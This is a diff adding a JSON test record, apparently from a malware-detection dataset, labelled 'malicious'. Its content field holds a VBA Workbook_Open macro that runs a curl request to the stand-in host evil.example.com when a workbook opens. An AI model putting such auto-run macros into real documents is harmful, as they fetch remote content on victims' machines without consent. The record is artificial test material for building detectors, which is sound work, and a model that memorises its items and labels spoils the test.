@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::38::paraphrase-variations::3",
+  "base_sample_id": "exp::document-office::38",
+  "generator_id": "paraphrase-variations",
+  "generator_version": "1.0.0",
+  "seed": -78787939,
+  "content": "Private Sub Workbook_Open()\n (in accordance with the protocol)  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "8e8803c2b14846fab580c23e195f1c22edb099bb7d7d4ed5b6b96d98a9aa7383",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "paraphrase:jargon",
+  "difficulty": "moderate"
+}
